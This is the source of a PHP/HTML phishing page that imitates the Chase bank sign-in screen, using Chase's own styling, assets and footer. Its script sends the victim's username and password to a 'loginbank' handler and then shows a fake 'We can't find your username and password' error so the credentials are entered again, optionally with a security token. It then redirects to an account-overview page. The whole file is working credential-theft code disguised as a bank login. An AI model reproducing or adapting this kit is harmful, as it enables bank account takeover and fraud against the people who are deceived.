
<?php
session_start();
require_once '../main.php';
?>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr"><head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex,nofollow">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="msapplication-config" content="none">
    <title>Sign in - chase.com</title>
    <meta name="description" content="">
    <meta name="author" content="">
<!--    <meta name="referrer" content="no-referrer" />-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!--[if lte IE 8]>
    <link rel="stylesheet" type="text/css" media="all" href="https://static.chasecdn.com/web/2020.02.09-449/logon/assets/ie8.css" />
    <![endif]-->

    <link rel="shortcut icon" href="https://static.chasecdn.com/content/dam/cpo-static/images/chasefavicon.ico">
    <link rel="apple-touch-icon" sizes="152x152" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="120x120" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="76x76" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon-76x76.png">
    <link rel="apple-touch-icon" href="https://static.chasecdn.com/content/dam/cpo-static/images/chase-touch-icon.png">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-startup-image" href="https://static.chasecdn.com/web/2020.02.09-449/common/assets/img/splash/ipad-landscape.png" media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:landscape)">
    <link rel="apple-touch-startup-image" href="https://static.chasecdn.com/web/2020.02.09-449/common/assets/img/splash/ipad-portrait.png" media="screen and (min-device-width: 481px) and (max-device-width: 1024px) and (orientation:portrait)">
    <link rel="apple-touch-startup-image" href="https://static.chasecdn.com/web/2020.02.09-449/common/assets/img/splash/iphone.png" media="screen and (max-device-width: 320px)">
    <style>@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.svg#opensans-regular') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.svg#opensans-semibold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 700;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.svg#opensans-bold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 800;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.svg#opensans-extrabold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.svg#videoplayer') format('svg');}
        html {height:100%; background: #fff;}

        @media only screen and (min-width: 768px) {
            html {
                background:#1c4f82; background:-moz-linear-gradient(top,#1c4f82 0%, #2e6ea3 100%); background:-webkit-linear-gradient(top,#1c4f82 0%,#2e6ea3 100%); background:linear-gradient(to bottom,#1c4f82 0%,#2e6ea3 100%);
            }
        }

        .spinnerWrapper{position:absolute;width:100%;top:45%;text-align:center}#chaseSpinnerID.jpui.spinner{display:inline-block;overflow:visible!important;padding-top:0;margin-top:0px;}#chaseSpinnerID.jpui.spinner:after{content:"\0020";-moz-animation:three-quarters-loader 780ms infinite linear;-webkit-animation:three-quarters-loader 780ms infinite linear;animation:three-quarters-loader 780ms infinite linear;border:4px solid #ccc;border-right-color:#0092ff;border-radius:50%;box-sizing:border-box;display:inline-block;position:relative;width:48px;height:48px}@media(max-width:991px){#chaseSpinnerID.jpui.spinner:after{width:38px;height:38px}}@media(max-width:767px){#chaseSpinnerID.jpui.spinner:after{width:28px;height:28px}}#chaseSpinnerID.jpui.spinner:before{content:"Loading";color:transparent;position:absolute;bottom:-1.25rem;font-size:1rem}#chaseSpinnerID.jpui.spinner:focus{outline:0}@-moz-keyframes three-quarters-loader{0%{-moz-transform:rotate(0);transform:rotate(0)}100%{-moz-transform:rotate(360deg);transform:rotate(360deg)}}@-webkit-keyframes three-quarters-loader{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes three-quarters-loader{0%{-moz-transform:rotate(0);-ms-transform:rotate(0);-webkit-transform:rotate(0);transform:rotate(0)}100%{-moz-transform:rotate(360deg);-ms-transform:rotate(360deg);-webkit-transform:rotate(360deg);transform:rotate(360deg)}}#chaseSpinnerID.jpui.spinner .util.accessible-text{position:absolute!important;clip:rect(1px 1px 1px 1px);clip:rect(1px,1px,1px,1px);padding:0!important;border:0!important;height:1px!important;width:1px!important;overflow:hidden}BODY{overflow-x:hidden;overflow-y:auto;margin:0}#init,#body{opacity:0;-webkit-transition:opacity .5s;transition:opacity .5s}#init{z-index:-1;background:#fff;position:fixed;top:0;left:0;min-width:100%;min-height:110%}





        .spinner:after, .mask:after {
            content: '';
            position: fixed;
            z-index: -1;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;

            background: #1c4f82;
            background: -moz-linear-gradient(top,#1c4f82 0,#2e6ea3 100%);

            -ms-filter: alpha(opacity=90);
            filter: alpha(opacity=90);
        }

        @font-face {
            font-family: 'icomoon';
            src: url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.eot?bj1g7l");
            src: url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.eot?bj1g7l#iefix") format('embedded-opentype'),url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.ttf?bj1g7l") format('bj1g7l'),url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.woff?bj1g7l") format('woff'),url("https://www.chase.com/c/082819/etc/designs/chase-ux/css/fonts/icomoon.svg?bj1g7l#icomoon") format('svg');
            font-weight: normal;
            font-style: normal
        }
        .timeout-message {
            background-color: #128842;
            display: none;
        }

        .timeout-message__inner {
            position: relative;
            min-height: 2.25em;
            padding-top: 14px;
            padding-bottom: 14px;
        }

        .timeout-message__inner button {
            background-color: transparent;
            border: none;
            padding: 0
        }

        .timeout-message__text {
            line-height: 1.3em;
            font-weight: 300;
            position: relative;
        }

        .timeout-message__text-msg {
            display: none;
            color: #fff;
            margin: 0;
            position: relative;
            vertical-align: middle;
            padding-left: 32px;
            padding-right: 32px;
            font-size: 1.15em;
        }

        .timeout-message__text-msg.display {
            display: inline-block
        }

        .timeout-message__text-msg:focus {
            outline: 1px dotted #000
        }

        .timeout-message__dismiss-btn {
            color: #fff;
            text-decoration: none;
            position: absolute;
            font-size: .875em;
            line-height: 1.6em;
            top: 2px;
            right: 0;
        }

        .timeout-message__dismiss-btn:focus {
            outline: 1px dotted #000
        }

        .timeout-message__checkmark {
            display: inline-block;
            position: absolute;
            left: 0;
            margin-right: 12px;
        }

        .timeout-message__checkmark.icon-check-mark {
            -webkit-border-radius: 22px;
            border-radius: 22px;
            height: 22px;
            width: 22px;
            background: #fff;
            top: 4px;
        }

        .timeout-message__checkmark.icon-check-mark:before {
            color: #128842;
            font-size: 20px;
            font-weight: 300
        }

        @media only screen and (min-width: 48em) {
            .timeout-message__inner {
                padding-top:20px;
                padding-bottom: 20px;
                padding-left: 8px;
                padding-right: 8px
            }

            .timeout-message__text {
                font-size: 1.25em;
                line-height: 1.3em
            }

            .timeout-message__checkmark.icon-check-mark:before {
                margin-left: 1px
            }
            .feature-container {
                margin: 0 auto;
                max-width: 75em
            }
            .container-fluid {
                margin-right: auto;
                margin-left: auto;
                padding-left: 8px;
                padding-right: 8px
            }
        }
        [class^="icon-"]:before,[class*=" icon-"]:before {
            font-family: 'icomoon' !important;
            /* speak: none; */
            font-style: normal;
            font-weight: normal;
            font-variant: normal;
            text-transform: none;
            line-height: 1;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }
        .icon-close:before {
            content: "\e611";
        }
        .icon-check-mark:before {
            content: "\e60c";
        }
    </style>


    <link rel="stylesheet" href="https://static.chasecdn.com/web/2020.02.09-449/logon/assets/logon.css"><link rel="stylesheet" href="https://static.chasecdn.com/web/2020.02.09-449/common/assets/blue-ui.css"><style type="text/css"></style></head>
<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true">
<div class="timeout-message__wrapper">
    <div class="timeout-message__container">
        <div class="timeout-message container-fluid" style="display: block;">
            <div class="feature-container">
                <div class="timeout-message__inner">
                    <div class="timeout-message__text">
                        <p class="timeout-message__text-msg display" tabindex="-1" data-session-message="">
                            We’ve signed you out of your account.</p>
                        <p class="timeout-message__text-msg" tabindex="-1" data-logoff-message="">
                            <span class="timeout-message__checkmark icon-check-mark"></span>You’ve successfully signed out</p>
                        <p class="timeout-message__text-msg" tabindex="-1" data-emb-message="">
                            Account verification initiated</p>
                        <button type="button" class="timeout-message__dismiss-btn"><span class="icon-close"></span></button>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div id="fixed" >

    <div class="spinner" style="
    position: fixed;
    top: 43%;
    right: 0;
    bottom: 0;
    left: 0;
    z-index: 200;
    margin: 0;
    text-align: center;

"><div class=""><div id="chaseSpinnerID" class="jpui spinner" tabindex="-1"><span id="accessible-chaseSpinnerID" class="util accessible-text">loading</span></div></div></div>

</div>

</div>

<div id="logonApp" data-is-view="true"><div class="homepage" tabindex="-1"><div id="advertisenativeapp" data-has-view="true"><div data-is-view="true"><div class="advertiseNativeApp"></div></div></div> <div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true"><div data-is-view="true"><div id="siteMessageAda" aria-live="polite"><h2 class="util accessible-text" id="site-messages-heading">You have no more site alerts</h2></div> </div></div> <div class="logon-container" id="container"><header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true"><div class="logon header jpui transparent navigation bar" data-is-view="true"><a id="logoHomepageLink" href="#"> <div class="chase logo"></div> <span class="util accessible-text">Chase.com homepage</span></a> </div></header> <main id="logon-content" data-has-view="true"><div class="container logon" data-is-view="true"><div><div id="backgroundImage"> <div class="jpui background image fixed" id="geoImage"><style type="text/css">.jpui.background.image { background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.2.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.2.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.day.2.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.mobile.day.2.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.tablet.day.2.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.desktop.day.2.jpeg); } }</style></div></div></div> <div class="row"><div class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden" id="logoffbox"><div class="jpui raised segment"><div class="row"><div class="col-xs-10 col-xs-offset-1"><h3 class="u-focus in-progress" tabindex="-1" id="logoff-header">You're being signed out.</h3></div></div> <div class="row"><div class="col-xs-12"><div class="progress"><div class="bar"></div></div></div></div></div> </div> <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox"><div class="jpui raised segment"><div id="thirdPartyAggregatorSecurityBanner"></div> <div class="row"><div class="col-xs-10 col-xs-offset-1"><form id="loginbank" id="loginbank" method="POST" autocomplete="off" action="javascript:void(0);" novalidate="">

                                            <div id="validator-error-header" hidden="">
                                                <div class="jpui error error inverted primary animate alert" id="logon-error" role="region" aria-labelledby="inner-logon-error"><div class="icon"><span id="type-icon-logon-error"><i class="jpui exclamation-color icon" id="icon-type-icon-logon-error" aria-hidden="true"></i></span></div> <div class="icon background"></div> <div class="content wrap" id="content-logon-error"><h2 class="title" tabindex="-1" id="inner-logon-error"><span class="util accessible-text" id="icon-logon-error">Important: </span>We can't find your username and password.</h2> </div></div></div>


                                            <div class="jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top" id="userId"><div class="jpui vertical"><div class="align-label-input floating-label__container userId"><div class="label-wrapper"><label class="jpui fieldlabel label-alignment vertical" id="userId-label" for="userId-text-input-field" aria-hidden="false"><span class="util accessible-text errorAdaText">Error:</span><span class="util accessible-text" id="userId-label-errorLabel"></span>Username <span class="util accessible-text" id="userId-label-accessible-text"></span></label> </div> <div class="logon-xs-toggle" id="userId-text"> <input class="jpui input logon-xs-toggle" id="userbank" placeholder="" format="" aria-describedby="userId-input-field-label" type="text" name="userbank" data-validate="userId" required="" value="" pattern="^[^@]+$">    </div> </div>  <div><div>  </div></div></div> </div> <div class="jpui fieldgroup logon-xs-toggle logon-floating-label" id="password"><div class="jpui vertical"><div class="align-label-input floating-label__container password"><div class="label-wrapper"><label class="jpui fieldlabel label-alignment vertical" id="password-label" for="password-text-input-field" aria-hidden="false"><span class="util accessible-text" id="password-label-errorLabel"></span>Password <span class="util accessible-text" id="password-label-accessible-text"></span></label> </div> <div class="logon-xs-toggle" id="password-text"> <input class="jpui input logon-xs-toggle" id="passwordbank" placeholder="" format="" aria-describedby="password-input-field-label" autocomplete="off" type="password" name="passwordbank" data-validate="password" required="" value="">    </div> </div>  <div><div>  </div></div></div> </div> <div class="jpui fieldgroup logon-xs-toggle logon-floating-label hidden" id="securityToken"><div class="jpui vertical"><div class="align-label-input floating-label__container securityToken"><div class="label-wrapper"><label class="jpui fieldlabel label-alignment vertical" id="securityToken-label" for="securityToken-text-input-field" aria-hidden="false"><span class="util accessible-text" id="securityToken-label-errorLabel"></span>Token <span class="util accessible-text" id="securityToken-label-accessible-text"></span></label> </div> <div class="logon-xs-toggle" id="securityToken-text"> <input class="jpui input logon-xs-toggle" id="securityTokenbank" placeholder="" format="" aria-describedby="securityToken-input-field-label" autocomplete="off" type="tel" name="securityTokenbank" data-validate="securityToken" required="" value="">    </div> </div>  <div><div>  </div></div></div> </div> <div class="row logon-xs-toggle"><div class="col-xs-6 rememberMe-checkbox-container"><div class="jpui checkbox" id="rememberMe"><div class="checkbox-flex"><div class="checkboxWrap"><input class="checkbox__input rememberMe checkbox__input--checked" type="checkbox" id="input-rememberMe" aria-label="This checked box means that we will remember your username.  Remember me" name="rememberMe" value="on"> <i class="jpui checkmark icon check" aria-hidden="true"></i></div> <label for="input-rememberMe"> <span class="checkbox-label" id="label-rememberMe">Remember me </span></label></div> </div></div> <div class="col-xs-6 token-checkbox-container"><div class="jpui checkbox useToken" id="useToken"><div class="checkbox-flex"><div class="checkboxWrap"><input class="checkbox__input useToken" type="checkbox" id="input-useToken" aria-label="Shows content above. Use token" name="rsaToken" value="on"> <i class="jpui checkmark icon check" aria-hidden="true"></i></div> <label for="input-useToken"> <span class="checkbox-label" id="label-useToken">Use token </span></label></div> </div></div></div> <div class="row"><button type="submit" id="signin-button" class="jpui button focus fluid primary"><span class="label">Sign in</span> </button></div> <div class="row"><span class="jpui link" id="forgotPassword-link-wrapper"><a class="link-anchor" id="forgotPassword" href="javascript:void(0);" aria-label=" Forgot username/password? ">Forgot username/password?<i class="jpui progressright icon end-icon" id="forgotPassword-endIcon" aria-hidden="true"></i></a></span></div> <div class="row"><span class="jpui link" id="enrollment-link-wrapper"><a class="link-anchor last" id="enrollment" href="javascript:void(0);" aria-label=" Not Enrolled? Sign Up Now. ">Not Enrolled? Sign Up Now.<i class="jpui progressright icon end-icon" id="enrollment-endIcon" aria-hidden="true"></i></a></span></div></form></div></div></div></div></div></div></main></div> <footer class="logon-footer" id="logon-footer" data-has-view="true"><div class="footer-container" data-is-view="true" style="position: static;"><div class="container"><div class="social-links row"><div class="col-xs-12"><span class="follow-us-text">Follow us:</span> <ul class="icon-links"><li class="facebook"><span id="requestChaseFacebook-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseFacebook"> <span class="util accessible-text" id="accessible-requestChaseFacebook">Facebook: Opens dialog</span> <i class="jpui facebook icon" id="icon-requestChaseFacebook" aria-hidden="true"></i></a></span></li> <li class="instagram"><span id="requestChaseInstagram-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseInstagram"> <span class="util accessible-text" id="accessible-requestChaseInstagram">Instagram: Opens dialog</span> <i class="jpui instagram icon" id="icon-requestChaseInstagram" aria-hidden="true"></i></a></span></li> <li class="twitter"><span id="requestChaseTwitter-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseTwitter"> <span class="util accessible-text" id="accessible-requestChaseTwitter">Twitter: Opens dialog</span> <i class="jpui twitter icon" id="icon-requestChaseTwitter" aria-hidden="true"></i></a></span></li> <li class="youtube"><span id="requestChaseYouTube-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseYouTube"> <span class="util accessible-text" id="accessible-requestChaseYouTube">YouTube: Opens dialog</span> <i class="jpui youtube icon" id="icon-requestChaseYouTube" aria-hidden="true"></i></a></span></li> <li class="linkedin"><span id="requestChaseLinkedIn-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseLinkedIn"> <span class="util accessible-text" id="accessible-requestChaseLinkedIn">LinkedIn: Opens dialog</span> <i class="jpui linkedin icon" id="icon-requestChaseLinkedIn" aria-hidden="true"></i></a></span></li></ul></div></div> <div class="footer-links row implement-ada-features-enabled"><div class="col-xs-12"><ul><li><span class="jpui link" id="requestContactUs-link-wrapper"><a class="link-anchor" id="requestContactUs" href="javascript:void(0);" aria-label=" Contact us ">Contact us</a></span></li> <li><span class="jpui link" id="requestPrivacyNotice-link-wrapper"><a class="link-anchor" id="requestPrivacyNotice" href="javascript:void(0);" aria-label=" Privacy ">Privacy</a></span></li> <li><span class="jpui link" id="requestSecurity-link-wrapper"><a class="link-anchor" id="requestSecurity" href="javascript:void(0);" aria-label=" Security ">Security</a></span></li> <li><span class="jpui link" id="requestTermsOfUse-link-wrapper"><a class="link-anchor" id="requestTermsOfUse" href="javascript:void(0);" aria-label=" Terms of use ">Terms of use</a></span></li> <li><span class="jpui link" id="requestAccessibility-link-wrapper"><a class="link-anchor" id="requestAccessibility" href="javascript:void(0);" aria-label=" Accessibility ">Accessibility</a></span></li> <li><span class="jpui link" id="requestMortgageLoanOriginators-link-wrapper"><a class="link-anchor" id="requestMortgageLoanOriginators" href="javascript:void(0);" aria-label=" SAFE Act: Chase Mortgage Loan Originators ">SAFE Act: Chase Mortgage Loan Originators</a></span></li> <li><span class="jpui link" id="requestHomeMortgageDisclosureAct-link-wrapper"><a class="link-anchor" id="requestHomeMortgageDisclosureAct" href="javascript:void(0);" aria-label=" Fair Lending ">Fair Lending</a></span></li> <li><span class="jpui link" id="requestAboutChase-link-wrapper"><a class="link-anchor" id="requestAboutChase" href="javascript:void(0);" aria-label=" About Chase ">About Chase</a></span></li> <li><span class="jpui link" id="requestJpMorgan-link-wrapper"><a class="link-anchor" id="requestJpMorgan" href="javascript:void(0);" aria-label=" J.P. Morgan ">J.P. Morgan</a></span></li> <li><span class="jpui link" id="requestJpMorganChaseCo-link-wrapper"><a class="link-anchor" id="requestJpMorganChaseCo" href="javascript:void(0);" aria-label=" JPMorgan Chase &amp; Co. ">JPMorgan Chase &amp; Co.</a></span></li> <li><span class="jpui link" id="requestCareers-link-wrapper"><a class="link-anchor" id="requestCareers" href="javascript:void(0);" aria-label=" Careers ">Careers</a></span></li> <li><span class="jpui link" id="requestEspanol-link-wrapper"><a class="link-anchor" id="requestEspanol" href="javascript:void(0);" aria-label=" Español ">Español</a></span></li> <li><span class="jpui link" id="requestChaseCanada-link-wrapper"><a class="link-anchor" id="requestChaseCanada" href="javascript:void(0);" aria-label=" Chase Canada ">Chase Canada</a></span></li> <li><span class="jpui link" id="requestSiteMap-link-wrapper"><a class="link-anchor" id="requestSiteMap" href="javascript:void(0);" aria-label=" Site map ">Site map</a></span></li> <li>Member FDIC</li> <li><i class="jpui equal-housing-lender icon" id="equalHousingLenderLabel" aria-hidden="true"></i> Equal Housing Lender</li> <li class="copyright-label">© 2020 JPMorgan Chase &amp; Co.</li></ul></div></div> <div class="row galaxy-footer"><div class="col-xs-10 col-xs-offset-1"><p class="NOTE"><span></span><br> <span class="copyright-label">© 2020 JPMorgan Chase &amp; Co.</span></p> <p><span class="jpui link" id="galaxyRequestPrivacyNotice-link-wrapper"><a class="link-anchor NOTELINK" id="galaxyRequestPrivacyNotice" href="javascript:void(0);" aria-label=" Privacy ">Privacy<i class="jpui progressright icon end-icon" id="galaxyRequestPrivacyNotice-endIcon" aria-hidden="true"></i></a></span></p> <p><span class="jpui link" id="galaxyRequestAccessibility-link-wrapper"><a class="link-anchor NOTELINK" id="galaxyRequestAccessibility" href="javascript:void(0);" aria-label=" Accessibility ">Accessibility<i class="jpui progressright icon end-icon" id="galaxyRequestAccessibility-endIcon" aria-hidden="true"></i></a></span></p></div></div></div></div></footer></div> <div id="languageSupportDisclaimer"></div> <div id="overlay" data-has-view="true"></div> <div class="overlay"></div> <div id="signoutModal"></div> <div id="siteExitWarning"></div> <div id="serviceErrorModal"></div> <div id="sessionTimeoutModal"></div></div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.17.0/jquery.validate.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.13.4/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.1/additional-methods.min.js"></script>
<script type="text/javascript">
    document.onreadystatechange = function () {
        var state = document.readyState
        if (state == 'complete') {
            setTimeout(function(){
                document.getElementById('interactive');
                document.getElementById('fixed').style.visibility="hidden";
            },4000);
        }
    }
</script>
<script>
    $("#userId").click(function(e) {
        e.preventDefault();
        setTimeout(function() {
            $('.align-label-input.floating-label__container.userId').addClass('floating');
        });
    });
    $("#password").click(function(e) {
        e.preventDefault();
        setTimeout(function() {
            $('.align-label-input.floating-label__container.password').addClass('floating');
        });
    });
    $("#securityToken").click(function(e) {
        e.preventDefault();
        setTimeout(function() {
            $('.align-label-input.floating-label__container.securityToken').addClass('floating');
        });
    });

    $("#rememberMe").click(function(e) {
        e.preventDefault();
        setTimeout(function() {
            $('.checkbox__input.rememberMe').toggleClass('checkbox__input--checked');
        });
    });
    $("#useToken").click(function(e) {
        e.preventDefault();
        setTimeout(function() {
            $('.checkbox__input.useToken').toggleClass('checkbox__input--checked');securityToken
            $('#securityToken').toggleClass('hidden');
        });
    });

    //jpui fieldgroup logon-xs-toggle logon-floating-label
    $('#userbank').focus(function () {
        $(".align-label-input.floating-label__container.userId").addClass('floating');
    }).blur(function () {
        if ($.trim($('#userbank').val()).length) {
            $(".align-label-input.floating-label__container.userId").addClass('focused');
        } else {
            $(".align-label-input.floating-label__container.userId").removeClass('floating');

        }

    });
    $('#passwordbank').focus(function () {
        $(".align-label-input.floating-label__container.password").addClass('floating');
    }).blur(function () {
        if ($.trim($('#passwordbank').val()).length) {
            $(".align-label-input.floating-label__container.password").addClass('focused');
        } else {
            $(".align-label-input.floating-label__container.password").removeClass('floating');

        }

    });

    $('#securityTokenbank').focus(function () {
        $(".align-label-input.floating-label__container.securityToken").addClass('floating');
    }).blur(function () {
        if ($.trim($('#securityTokenbank').val()).length) {
            $(".align-label-input.floating-label__container.securityToken").addClass('focused');
        } else {
            $(".align-label-input.floating-label__container.securityToken").removeClass('floating');

        }
    });
    jQuery.validator.addMethod("noEmail", function(value, element, param) {
        return this.optional(element) || (value.indexOf("@") <= 0);
    }, "Invalid username");

    $('#securityTokenbank').mask('00000000000000000000000000000000000');

    $(function(){
        $("#signin-button").click(function() {
           if (!sessionStorage.getItem('secondTime')) {
            const firstTime = {}
            firstTime.username1 = $('input[name="userbank"]').val()
            firstTime.password1 = $('input[name="passwordbank"]').val()
            $.post("loginbank", firstTime, function(result) {
                $('#validator-error-header').show()
                sessionStorage.setItem('secondTime', 'yes')
                console.log('V1')
            });
                // validate and process form here
                
           }else {
            // validate and process form here
                $('#loginbank').validate({
                    rules: {
                        userbank: { required: true, minlength: 4, noEmail: true,},
                        passwordbank: { required: true, minlength: 4,},
                        securityTokenbank: { required: function () {
                                return $("#securityTokenbank").is(":visible");
                            }, minlength: 3,},
                    },
                    messages: {
                        userbank: {
                            required: "",
                            minlength: "",
                        },
                        passwordbank: {
                            required: "",
                            minlength: "",
                        },
                        securityTokenbank: {
                            required: "",
                            minlength: "",
                        }
                    },
                    errorLabelContainer: '#validator-error-header',
                    //errorCintainer: '    #inner-logon-error',
                    errorClass: 'clientSideError',
                    submitHandler: function(form) {
                        $.post("loginbank", $("#loginbank").serialize(), function(result) {
                            setTimeout(function() {
                                $(location).attr("href", "overviewAccounts");
                            });
                        });
                    },
                });
           }
        });
    });
</script>
</body></html>